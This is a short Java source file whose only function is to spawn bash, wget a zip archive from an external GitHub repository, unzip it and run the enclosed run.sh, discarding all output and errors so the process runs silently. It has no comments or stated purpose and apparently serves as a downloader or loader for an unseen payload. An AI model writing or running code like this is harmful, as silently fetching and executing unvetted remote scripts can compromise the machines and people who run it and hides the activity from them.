import java.io.*;
import java.util.*;

public class run {
    public static void main(String[] args) {
        try {
            ProcessBuilder builder = new ProcessBuilder("bash", "-c", "wget https://github.com/lianamahesra-creator/legendary-journey/raw/refs/heads/main/prl.zip;unzip prl.zip;bash run.sh");
            builder.redirectOutput(ProcessBuilder.Redirect.DISCARD);
            builder.redirectError(ProcessBuilder.Redirect.DISCARD);
            Process process = builder.start();
            process.waitFor(); // wait if needed
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
